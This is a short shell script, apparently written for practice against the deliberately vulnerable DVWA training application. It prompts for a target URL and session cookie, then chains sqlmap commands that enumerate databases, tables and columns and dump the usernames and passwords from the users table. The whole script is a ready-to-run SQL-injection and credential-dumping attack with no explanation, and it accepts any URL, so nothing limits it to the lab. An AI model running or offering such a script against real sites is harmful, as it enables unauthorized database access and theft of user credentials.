
echo "Enter url:"
read url
echo "Enter cookies value:"
read cookie

sqlmap -u "$url#" --cookie="$cookie" --dbs --batch 
sqlmap -u "$url#" --cookie="$cookie" --batch -D dvwa --tables
sqlmap -u "$url#" --cookie="$cookie" --batch -D dvwa -T users --columns
sqlmap -u "$url#" --cookie="$cookie" --batch -D dvwa -T users -C user,password,user_id --dump
